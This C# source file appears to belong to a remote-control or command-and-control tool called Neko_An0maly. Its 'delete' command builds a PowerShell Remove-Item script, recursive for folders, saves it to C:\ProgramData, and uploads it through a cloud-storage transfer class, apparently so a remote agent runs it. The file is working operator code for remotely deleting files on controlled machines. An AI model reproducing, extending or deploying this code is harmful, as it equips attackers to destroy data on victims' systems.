using System;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;
using Neko_An0maly.CORE;

namespace Neko_An0maly.Commands
{
    public class Delete : Command
    {
        public static string path = @"C:\ProgramData\";

        public Delete(string name) : base(name) { }

        public override string execute(string[] args)
        {
            if (args.Length == 3)
            {
                if (args[1] == "file")
                {
                    Console.WriteLine("Initializing command to be sent.");

                    string fileName = args[0] + ".ps1";
                    string finalPath = path + fileName;
                    using (FileStream fs = File.Create(finalPath))
                    {
                        byte[] line1 = new UTF8Encoding(true).GetBytes("\nRemove-Item " + (char)34 + args[2] + (char)34);
                        fs.Write(line1, 0, line1.Length);
                    }

                    Console.WriteLine("Initializing upload.");

                    TransferProtocol.upload(finalPath);

                    return "";
                }
                else if (args[1] == "folder")
                {
                    Console.WriteLine("Initializing command to be sent.");

                    string fileName = args[0] + ".ps1";
                    string finalPath = path + fileName;
                    using (FileStream fs = File.Create(finalPath))
                    {
                        byte[] line1 = new UTF8Encoding(true).GetBytes("\nRemove-Item " + (char)34 + args[2] + (char)34 + " -Recurse");
                        fs.Write(line1, 0, line1.Length);
                    }

                    Console.WriteLine("Initializing upload.");

                    TransferProtocol.upload(finalPath);

                    return "";
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Invalid arguments for 'delete'. Either use 'file' or 'folder'.");
                    Console.ForegroundColor = ConsoleColor.White;
                    return "";
                }

            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid arguments for 'delete'.Requires 2 argument(s).");
                Console.ForegroundColor = ConsoleColor.White;
                return "";
            }
        }
    }
}